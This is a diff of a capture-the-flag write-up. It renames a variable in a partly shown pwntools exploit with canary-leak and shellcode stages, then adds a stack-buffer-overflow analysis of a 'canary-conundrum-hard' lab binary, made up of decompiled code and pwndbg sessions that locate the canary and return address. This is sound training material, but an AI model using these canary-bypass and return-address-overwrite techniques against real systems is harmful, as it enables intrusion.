@@ -10517,7 +10517,7 @@ p = process("/challenge/canary-conundrum-easy")
 buffer_addr = 0x7fff1917e570
 canary_addr = 0x7fff1917e5a8
 addr_of_saved_ip = 0x7fff1917e5b8
-offset_buffers_diff_challenge_frames = 144
+offset_buffers_consec_challenge_frames = 144
 
 # --- STAGE 1: LEAK CANARY ---
 # Calculate offset_to_canary and payload_size
@@ -10560,7 +10560,7 @@ shellcode_asm = """
    mov sil, 0x4
    syscall
 """
-shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_diff_challenge_frames
+shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_consec_challenge_frames
 shellcode = asm(shellcode_asm)
 print(f"Shellcode length: {len(shellcode)}")
 
@@ -10674,7 +10674,914 @@ This time, we will have to partially overwrite the return address to the address
 
 Requirements for crafting an exploit.
 
-- [ ] Location of `nth` buffer
-- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function.
-- [ ] Offset of the canary from the buffer
-- [ ] 
+- [ ] Location of the buffer
+- [ ] Location of the canary
+- [ ] Location of stored return address to `main()`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [ ] Expected substring in order to loop the `challenge()` function
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000000000010e0  __cxa_finalize@plt
+0x00000000000010f0  putchar@plt
+0x0000000000001100  __errno_location@plt
+0x0000000000001110  puts@plt
+0x0000000000001120  __stack_chk_fail@plt
+0x0000000000001130  printf@plt
+0x0000000000001140  read@plt
+0x0000000000001150  setvbuf@plt
+0x0000000000001160  __isoc99_scanf@plt
+0x0000000000001170  exit@plt
+0x0000000000001180  strerror@plt
+0x0000000000001190  strstr@plt
+```
+
+```
+pwndbg> info file
+Symbols from "/challenge/canary-conundrum-hard".
+Local exec file:
+        `/challenge/canary-conundrum-hard', file type elf64-x86-64.
+        Entry point: 0x11a0
+        0x0000000000000318 - 0x0000000000000334 is .interp
+        0x0000000000000338 - 0x0000000000000358 is .note.gnu.property
+        0x0000000000000358 - 0x000000000000037c is .note.gnu.build-id
+        0x000000000000037c - 0x000000000000039c is .note.ABI-tag
+        0x00000000000003a0 - 0x00000000000003d0 is .gnu.hash
+        0x00000000000003d0 - 0x0000000000000598 is .dynsym
+        0x0000000000000598 - 0x000000000000069d is .dynstr
+        0x000000000000069e - 0x00000000000006c4 is .gnu.version
+        0x00000000000006c8 - 0x0000000000000708 is .gnu.version_r
+        0x0000000000000708 - 0x00000000000007f8 is .rela.dyn
+        0x00000000000007f8 - 0x0000000000000900 is .rela.plt
+        0x0000000000001000 - 0x000000000000101b is .init
+        0x0000000000001020 - 0x00000000000010e0 is .plt
+        0x00000000000010e0 - 0x00000000000010f0 is .plt.got
+        0x00000000000010f0 - 0x00000000000011a0 is .plt.sec
+        0x00000000000011a0 - 0x0000000000001e85 is .text
+        0x0000000000001e88 - 0x0000000000001e95 is .fini
+        0x0000000000002000 - 0x00000000000020e0 is .rodata
+        0x00000000000020e0 - 0x0000000000002134 is .eh_frame_hdr
+        0x0000000000002138 - 0x0000000000002280 is .eh_frame
+        0x0000000000003d68 - 0x0000000000003d70 is .init_array
+        0x0000000000003d70 - 0x0000000000003d78 is .fini_array
+        0x0000000000003d78 - 0x0000000000003f68 is .dynamic
+        0x0000000000003f68 - 0x0000000000004000 is .got
+        0x0000000000004000 - 0x0000000000004010 is .data
+        0x0000000000004010 - 0x0000000000004030 is .bss
+```
+
+This time there are not functions that we can disassemble. We will have to use IDA in order to understand the challenge's functionality.
+
+#### `main()`
+
+```c showLineNumbers
+__int64 __fastcall main(unsigned int a1, char **binary_name, char **a3)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *binary_name);
+  puts("###");
+  putchar(10);
+  challenge(a1, (__int64)binary_name, (__int64)a3);
+  puts("### Goodbye!");
+  return 0LL;
+}
+```
+
+We can see that the `main()` function calls `challenge()`.
+
+#### `challenge()`
+
+```c showLineNumbers
+__int64 __fastcall challenge(unsigned int a1, __int64 binary_name, __int64 a3)
+{
+  int *v3; // rax
+  char *error_reason; // rax
+  size_t payload_size; // [rsp+30h] [rbp-80h] BYREF
+  void *buf; // [rsp+38h] [rbp-78h]
+  __int64 v9[11]; // [rsp+40h] [rbp-70h] BYREF
+  char v10; // [rsp+98h] [rbp-18h]
+  unsigned __int64 v11; // [rsp+A8h] [rbp-8h]
+
+  v11 = __readfsqword(0x28u);
+  memset(v9, 0, sizeof(v9));
+  v10 = 0;
+  buf = v9;
+  payload_size = 0LL;
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &payload_size);
+  printf("Send your payload (up to %lu bytes)!\n", payload_size);
+  if ( (int)read(0, buf, payload_size) < 0 )
+  {
+    v3 = __errno_location();
+    error_reason = strerror(*v3);
+    printf("ERROR: Failed to read input -- %s!\n", error_reason);
+    exit(1);
+  }
+  printf("You said: %s\n", (const char *)buf);
+  if ( strstr((const char *)buf, "REPEAT") )
+  {
+    puts("Backdoor triggered! Repeating challenge()");
+    return challenge(a1, binary_name, a3);
+  }
+  else
+  {
+    puts("Goodbye!");
+    return 0LL;
+  }
+}
+```
+
+We can see that the expected substring is `REPEAT`.
+
+- [ ] Location of the buffer
+- [ ] Location of the canary
+- [ ] Location of stored return address to `main()`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+
+
+In order to find the rest, we will have to use GDB. Let's begin by setting a breakpoint at `read@plt` calls.
+
+```
+pwndbg> break read@plt
+Breakpoint 1 at 0x1140
+```
+
+```
+pwndbg> run
+Starting program: /challenge/canary-conundrum-hard 
+###
+### Welcome to /challenge/canary-conundrum-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x00005db582994140 in read@plt ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+ RAX  0x7fffedf75bd0 ◂— 0
+ RBX  0x5db582994e10 ◂— endbr64 
+ RCX  0
+ RDX  2
+ RDI  0
+ RSI  0x7fffedf75bd0 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x5db58299503c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5db5829941a0 ◂— endbr64 
+ R13  0x7fffedf76d70 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fffedf75c40 —▸ 0x7fffedf76c80 ◂— 0
+ RSP  0x7fffedf75b88 —▸ 0x5db582994c4c ◂— mov dword ptr [rbp - 0x84], eax
+ RIP  0x5db582994140 (read@plt) ◂— endbr64 
+─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+ ► 0x5db582994140 <read@plt>      endbr64 
+   0x5db582994144 <read@plt+4>    bnd jmp qword ptr [rip + 0x2e5d]   <read>
+    ↓
+   0x7879a55201e0 <read>          endbr64 
+   0x7879a55201e4 <read+4>        mov    eax, dword ptr fs:[0x18]     EAX, [0x7879a5605558] => 0
+   0x7879a55201ec <read+12>       test   eax, eax                     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x7879a55201ee <read+14>     ✘ jne    read+32                     <read+32>
+ 
+   0x7879a55201f0 <read+16>       syscall  <SYS_read>
+   0x7879a55201f2 <read+18>       cmp    rax, -0x1000
+   0x7879a55201f8 <read+24>       ja     read+112                    <read+112>
+ 
+   0x7879a55201fa <read+26>       ret    
+ 
+   0x7879a55201fb <read+27>       nop    dword ptr [rax + rax]
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffedf75b88 —▸ 0x5db582994c4c ◂— mov dword ptr [rbp - 0x84], eax
+01:0008│-0b0 0x7fffedf75b90 ◂— 0x1be6a0
+02:0010│-0a8 0x7fffedf75b98 —▸ 0x7fffedf76d88 —▸ 0x7fffedf78b5c ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-0a0 0x7fffedf75ba0 —▸ 0x7fffedf76d78 —▸ 0x7fffedf78b3b ◂— '/challenge/canary-conundrum-hard'
+04:0020│-098 0x7fffedf75ba8 ◂— 0x1a55ff723
+05:0028│-090 0x7fffedf75bb0 ◂— 0xd68 /* 'h\r' */
+06:0030│-088 0x7fffedf75bb8 —▸ 0x7879a54a2951 (_IO_do_write+177) ◂— mov r13, rax
+07:0038│-080 0x7fffedf75bc0 ◂— 2
+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5db582994140 read@plt
+   1   0x5db582994c4c None
+   2   0x5db582994ddf None
+   3   0x7879a5436083 __libc_start_main+243
+   4   0x5db5829941ce None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of the buffer: `0x7fffedf75bd0`
+- [ ] Location of the canary
+- [ ] Location of stored return address to `main()`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+
+Our program is currently in the `read@plt` resolution, as shown by the `BACKTRACE` section.
+Let's finish this function and return back to `challenge()`.
+
+```
+pwndbg> fini
+Run till exit from #0  0x00005db582994140 in read@plt ()
+
+0x00005db582994c4c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+*RAX  1
+ RBX  0x5db582994e10 ◂— endbr64 
+*RCX  0x7879a55201f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  2
+ RDI  0
+ RSI  0x7fffedf75bd0 ◂— 0xa /* '\n' */
+ R8   0x23
+ R9   0x23
+ R10  0x5db58299503c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5db5829941a0 ◂— endbr64 
+ R13  0x7fffedf76d70 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fffedf75c40 —▸ 0x7fffedf76c80 ◂— 0
+*RSP  0x7fffedf75b90 ◂— 0x1be6a0
+*RIP  0x5db582994c4c ◂— mov dword ptr [rbp - 0x84], eax
+─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+ ► 0x5db582994c4c    mov    dword ptr [rbp - 0x84], eax     [0x7fffedf75bbc] <= 1
+   0x5db582994c52    cmp    dword ptr [rbp - 0x84], 0       1 - 0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
+   0x5db582994c59  ✔ jns    0x5db582994c87              <0x5db582994c87>
+    ↓
+   0x5db582994c87    mov    rax, qword ptr [rbp - 0x78]     RAX, [0x7fffedf75bc8] => 0x7fffedf75bd0 ◂— 0xa /* '\n' */
+   0x5db582994c8b    mov    rsi, rax                        RSI => 0x7fffedf75bd0 ◂— 0xa /* '\n' */
+   0x5db582994c8e    lea    rdi, [rip + 0x3d7]              RDI => 0x5db58299506c ◂— 'You said: %s\n'
+   0x5db582994c95    mov    eax, 0                          EAX => 0
+   0x5db582994c9a    call   printf@plt                  <printf@plt>
+ 
+   0x5db582994c9f    mov    rax, qword ptr [rbp - 0x78]
+   0x5db582994ca3    lea    rsi, [rip + 0x3d0]              RSI => 0x5db58299507a ◂— 0x544145504552 /* 'REPEAT' */
+   0x5db582994caa    mov    rdi, rax
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffedf75b90 ◂— 0x1be6a0
+01:0008│-0a8 0x7fffedf75b98 —▸ 0x7fffedf76d88 —▸ 0x7fffedf78b5c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0a0 0x7fffedf75ba0 —▸ 0x7fffedf76d78 —▸ 0x7fffedf78b3b ◂— '/challenge/canary-conundrum-hard'
+03:0018│-098 0x7fffedf75ba8 ◂— 0x1a55ff723
+04:0020│-090 0x7fffedf75bb0 ◂— 0xd68 /* 'h\r' */
+05:0028│-088 0x7fffedf75bb8 —▸ 0x7879a54a2951 (_IO_do_write+177) ◂— mov r13, rax
+06:0030│-080 0x7fffedf75bc0 ◂— 2
+07:0038│-078 0x7fffedf75bc8 —▸ 0x7fffedf75bd0 ◂— 0xa /* '\n' */
+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5db582994c4c None
+   1   0x5db582994ddf None
+   2   0x7879a5436083 __libc_start_main+243
+   3   0x5db5829941ce None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Let's get the addresses of the stored return address and the canary in order to calculate the offsets.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7fffedf75c50:
+ rip = 0x5db582994c4c; saved rip = 0x5db582994ddf
+ called by frame at 0x7fffedf76c90
+ Arglist at 0x7fffedf75b88, args: 
+ Locals at 0x7fffedf75b88, Previous frame's sp is 0x7fffedf75c50
+ Saved registers:
+  rbp at 0x7fffedf75c40, rip at 0x7fffedf75c48
+```
+
+- [x] Location of the buffer: `0x7fffedf75bd0`
+- [ ] Location of the canary
+- [x] Location of stored return address to `main()`: `0x7fffedf75c48`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+
+
+```
+pwndbg> x/20gx $rsi
+0x7fffedf75bd0:	0x000000000000000a	0x0000000000000000
+0x7fffedf75be0:	0x0000000000000000	0x0000000000000000
+0x7fffedf75bf0:	0x0000000000000000	0x0000000000000000
+0x7fffedf75c00:	0x0000000000000000	0x0000000000000000
+0x7fffedf75c10:	0x0000000000000000	0x0000000000000000
+0x7fffedf75c20:	0x0000000000000000	0x00005db582994e00
+0x7fffedf75c30:	0x00007fffedf76c80	0x09f08297323bdc00
+0x7fffedf75c40:	0x00007fffedf76c80	0x00005db582994ddf
+0x7fffedf75c50:	0x0000000000001000	0x00007fffedf76d88
+0x7fffedf75c60:	0x00007fffedf76d78	0x00000001001e8788
+```
+
+We can tell that the canary for this frame is at `0x7fffedf75c38`. We know this because it is 16 bytes before our stored return address, and also because of the `\x00` byte.
+
+- [x] Location of the buffer: `0x7fffedf75bd0`
+- [x] Location of the canary: `0x7fffedf75c38`
+- [x] Location of stored return address to `main()`: `0x7fffedf75c48`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+
+Let's run the program again, and pass `REPEAT` as the payload so that the `challenge()` is called again, and we get the `n+1`th frame.
+
+```
+pwndbg> run
+Starting program: /challenge/canary-conundrum-hard 
+###
+### Welcome to /challenge/canary-conundrum-hard!
+###
+
+Payload size: 6
+Send your payload (up to 6 bytes)!
+
+Breakpoint 1, 0x000058eca32a4140 in read@plt ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+ RAX  0x7fff591b0670 ◂— 0
+ RBX  0x58eca32a4e10 ◂— endbr64 
+ RCX  0
+ RDX  6
+ RDI  0
+ RSI  0x7fff591b0670 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x58eca32a503c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x58eca32a41a0 ◂— endbr64 
+ R13  0x7fff591b1810 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff591b06e0 —▸ 0x7fff591b1720 ◂— 0
+ RSP  0x7fff591b0628 —▸ 0x58eca32a4c4c ◂— mov dword ptr [rbp - 0x84], eax
+ RIP  0x58eca32a4140 (read@plt) ◂— endbr64 
+─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+ ► 0x58eca32a4140 <read@plt>      endbr64 
+   0x58eca32a4144 <read@plt+4>    bnd jmp qword ptr [rip + 0x2e5d]   <read>
+    ↓
+   0x7d5ff395c1e0 <read>          endbr64 
+   0x7d5ff395c1e4 <read+4>        mov    eax, dword ptr fs:[0x18]     EAX, [0x7d5ff3a41558] => 0
+   0x7d5ff395c1ec <read+12>       test   eax, eax                     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x7d5ff395c1ee <read+14>     ✘ jne    read+32                     <read+32>
+ 
+   0x7d5ff395c1f0 <read+16>       syscall  <SYS_read>
+   0x7d5ff395c1f2 <read+18>       cmp    rax, -0x1000
+   0x7d5ff395c1f8 <read+24>       ja     read+112                    <read+112>
+ 
+   0x7d5ff395c1fa <read+26>       ret    
+ 
+   0x7d5ff395c1fb <read+27>       nop    dword ptr [rax + rax]
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff591b0628 —▸ 0x58eca32a4c4c ◂— mov dword ptr [rbp - 0x84], eax
+01:0008│-0b0 0x7fff591b0630 ◂— 0x1be6a0
+02:0010│-0a8 0x7fff591b0638 —▸ 0x7fff591b1828 —▸ 0x7fff591b1b5c ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-0a0 0x7fff591b0640 —▸ 0x7fff591b1818 —▸ 0x7fff591b1b3b ◂— '/challenge/canary-conundrum-hard'
+04:0020│-098 0x7fff591b0648 ◂— 0x1f3a3b723
+05:0028│-090 0x7fff591b0650 ◂— 0xd68 /* 'h\r' */
+06:0030│-088 0x7fff591b0658 —▸ 0x7d5ff38de951 (_IO_do_write+177) ◂— mov r13, rax
+07:0038│-080 0x7fff591b0660 ◂— 6
+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x58eca32a4140 read@plt
+   1   0x58eca32a4c4c None
+   2   0x58eca32a4ddf None
+   3   0x7d5ff3872083 __libc_start_main+243
+   4   0x58eca32a41ce None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+We can finish out of `read@plt` and pass our payload: `REPEAT`.
+
+```
+pwndbg> fini
+Run till exit from #0  0x000058eca32a4140 in read@plt ()
+REPEAT
+0x000058eca32a4c4c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+*RAX  6
+ RBX  0x58eca32a4e10 ◂— endbr64 
+*RCX  0x7d5ff395c1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  6
+ RDI  0
+ RSI  0x7fff591b0670 ◂— 0x544145504552 /* 'REPEAT' */
+ R8   0x23
+ R9   0x23
+ R10  0x58eca32a503c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x58eca32a41a0 ◂— endbr64 
+ R13  0x7fff591b1810 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff591b06e0 —▸ 0x7fff591b1720 ◂— 0
+*RSP  0x7fff591b0630 ◂— 0x1be6a0
+*RIP  0x58eca32a4c4c ◂— mov dword ptr [rbp - 0x84], eax
+─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+ ► 0x58eca32a4c4c    mov    dword ptr [rbp - 0x84], eax     [0x7fff591b065c] <= 6
+   0x58eca32a4c52    cmp    dword ptr [rbp - 0x84], 0       6 - 0     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
+   0x58eca32a4c59  ✔ jns    0x58eca32a4c87              <0x58eca32a4c87>
+    ↓
+   0x58eca32a4c87    mov    rax, qword ptr [rbp - 0x78]     RAX, [0x7fff591b0668] => 0x7fff591b0670 ◂— 0x544145504552 /* 'REPEAT' */
+   0x58eca32a4c8b    mov    rsi, rax                        RSI => 0x7fff591b0670 ◂— 0x544145504552 /* 'REPEAT' */
+   0x58eca32a4c8e    lea    rdi, [rip + 0x3d7]              RDI => 0x58eca32a506c ◂— 'You said: %s\n'
+   0x58eca32a4c95    mov    eax, 0                          EAX => 0
+   0x58eca32a4c9a    call   printf@plt                  <printf@plt>
+ 
+   0x58eca32a4c9f    mov    rax, qword ptr [rbp - 0x78]
+   0x58eca32a4ca3    lea    rsi, [rip + 0x3d0]              RSI => 0x58eca32a507a ◂— 0x544145504552 /* 'REPEAT' */
+   0x58eca32a4caa    mov    rdi, rax
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff591b0630 ◂— 0x1be6a0
+01:0008│-0a8 0x7fff591b0638 —▸ 0x7fff591b1828 —▸ 0x7fff591b1b5c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0a0 0x7fff591b0640 —▸ 0x7fff591b1818 —▸ 0x7fff591b1b3b ◂— '/challenge/canary-conundrum-hard'
+03:0018│-098 0x7fff591b0648 ◂— 0x1f3a3b723
+04:0020│-090 0x7fff591b0650 ◂— 0xd68 /* 'h\r' */
+05:0028│-088 0x7fff591b0658 —▸ 0x7d5ff38de951 (_IO_do_write+177) ◂— mov r13, rax
+06:0030│-080 0x7fff591b0660 ◂— 6
+07:0038│-078 0x7fff591b0668 —▸ 0x7fff591b0670 ◂— 0x544145504552 /* 'REPEAT' */
+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x58eca32a4c4c None
+   1   0x58eca32a4ddf None
+   2   0x7d5ff3872083 __libc_start_main+243
+   3   0x58eca32a41ce None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> 
+Run till exit from #0  0x000058eca32a4c4c in ?? ()
+You said: REPEAT
+Backdoor triggered! Repeating challenge()
+Payload size: 
+```
+
+We can see that the address of the buffer for the `n`th frame is `0x7fff591b0670`.
+
+- [x] Location of the buffer: `0x7fffedf75bd0`
+- [x] Location of the canary: `0x7fffedf75c38`
+- [x] Location of stored return address to `main()`: `0x7fffedf75c48`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+   - [x] Location of buffer for `n` th frame: `0x7fff591b0670`
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+
+Let's provide some random payload size for this `n+1`th frame.
+
+```
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x000058eca32a4140 in read@plt ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+*RAX  0x7fff591b05b0 ◂— 0
+ RBX  0x58eca32a4e10 ◂— endbr64 
+*RCX  0
+*RDX  2
+ RDI  0
+*RSI  0x7fff591b05b0 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x58eca32a503c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x58eca32a41a0 ◂— endbr64 
+ R13  0x7fff591b1810 ◂— 1
+ R14  0
+ R15  0
+*RBP  0x7fff591b0620 —▸ 0x7fff591b06e0 —▸ 0x7fff591b1720 ◂— 0
+*RSP  0x7fff591b0568 —▸ 0x58eca32a4c4c ◂— mov dword ptr [rbp - 0x84], eax
+*RIP  0x58eca32a4140 (read@plt) ◂— endbr64 
+─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+ ► 0x58eca32a4140 <read@plt>      endbr64 
+   0x58eca32a4144 <read@plt+4>    bnd jmp qword ptr [rip + 0x2e5d]   <read>
+    ↓
+   0x7d5ff395c1e0 <read>          endbr64 
+   0x7d5ff395c1e4 <read+4>        mov    eax, dword ptr fs:[0x18]     EAX, [0x7d5ff3a41558] => 0
+   0x7d5ff395c1ec <read+12>       test   eax, eax                     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x7d5ff395c1ee <read+14>     ✘ jne    read+32                     <read+32>
+ 
+   0x7d5ff395c1f0 <read+16>       syscall  <SYS_read>
+   0x7d5ff395c1f2 <read+18>       cmp    rax, -0x1000
+   0x7d5ff395c1f8 <read+24>       ja     read+112                    <read+112>
+ 
+   0x7d5ff395c1fa <read+26>       ret    
+ 
+   0x7d5ff395c1fb <read+27>       nop    dword ptr [rax + rax]
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff591b0568 —▸ 0x58eca32a4c4c ◂— mov dword ptr [rbp - 0x84], eax
+01:0008│-0b0 0x7fff591b0570 ◂— 0
+02:0010│-0a8 0x7fff591b0578 —▸ 0x7fff591b1828 —▸ 0x7fff591b1b5c ◂— 'SHELL=/run/dojo/bin/bash'
+03:0018│-0a0 0x7fff591b0580 —▸ 0x7fff591b1818 —▸ 0x7fff591b1b3b ◂— '/challenge/canary-conundrum-hard'
+04:0020│-098 0x7fff591b0588 ◂— 0x1f3a3b723
+05:0028│-090 0x7fff591b0590 ◂— 0xd68 /* 'h\r' */
+06:0030│-088 0x7fff591b0598 —▸ 0x7d5ff38de951 (_IO_do_write+177) ◂— mov r13, rax
+07:0038│-080 0x7fff591b05a0 ◂— 2
+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x58eca32a4140 read@plt
+   1   0x58eca32a4c4c None
+   2   0x58eca32a4ce1 None
+   3   0x58eca32a4ddf None
+   4   0x7d5ff3872083 __libc_start_main+243
+   5   0x58eca32a41ce None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Let's finish out of `read@plt`.
+
+```
+pwndbg> fini
+Run till exit from #0  0x000058eca32a4140 in read@plt ()
+
+0x000058eca32a4c4c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+*RAX  1
+ RBX  0x58eca32a4e10 ◂— endbr64 
+*RCX  0x7d5ff395c1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  2
+ RDI  0
+ RSI  0x7fff591b05b0 ◂— 0xa /* '\n' */
+ R8   0x23
+ R9   0x23
+ R10  0x58eca32a503c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x58eca32a41a0 ◂— endbr64 
+ R13  0x7fff591b1810 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff591b0620 —▸ 0x7fff591b06e0 —▸ 0x7fff591b1720 ◂— 0
+*RSP  0x7fff591b0570 ◂— 0
+*RIP  0x58eca32a4c4c ◂— mov dword ptr [rbp - 0x84], eax
+─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+ ► 0x58eca32a4c4c    mov    dword ptr [rbp - 0x84], eax     [0x7fff591b059c] <= 1
+   0x58eca32a4c52    cmp    dword ptr [rbp - 0x84], 0       1 - 0     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
+   0x58eca32a4c59  ✔ jns    0x58eca32a4c87              <0x58eca32a4c87>
+    ↓
+   0x58eca32a4c87    mov    rax, qword ptr [rbp - 0x78]     RAX, [0x7fff591b05a8] => 0x7fff591b05b0 ◂— 0xa /* '\n' */
+   0x58eca32a4c8b    mov    rsi, rax                        RSI => 0x7fff591b05b0 ◂— 0xa /* '\n' */
+   0x58eca32a4c8e    lea    rdi, [rip + 0x3d7]              RDI => 0x58eca32a506c ◂— 'You said: %s\n'
+   0x58eca32a4c95    mov    eax, 0                          EAX => 0
+   0x58eca32a4c9a    call   printf@plt                  <printf@plt>
+ 
+   0x58eca32a4c9f    mov    rax, qword ptr [rbp - 0x78]
+   0x58eca32a4ca3    lea    rsi, [rip + 0x3d0]              RSI => 0x58eca32a507a ◂— 0x544145504552 /* 'REPEAT' */
+   0x58eca32a4caa    mov    rdi, rax
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff591b0570 ◂— 0
+01:0008│-0a8 0x7fff591b0578 —▸ 0x7fff591b1828 —▸ 0x7fff591b1b5c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0a0 0x7fff591b0580 —▸ 0x7fff591b1818 —▸ 0x7fff591b1b3b ◂— '/challenge/canary-conundrum-hard'
+03:0018│-098 0x7fff591b0588 ◂— 0x1f3a3b723
+04:0020│-090 0x7fff591b0590 ◂— 0xd68 /* 'h\r' */
+05:0028│-088 0x7fff591b0598 —▸ 0x7d5ff38de951 (_IO_do_write+177) ◂— mov r13, rax
+06:0030│-080 0x7fff591b05a0 ◂— 2
+07:0038│-078 0x7fff591b05a8 —▸ 0x7fff591b05b0 ◂— 0xa /* '\n' */
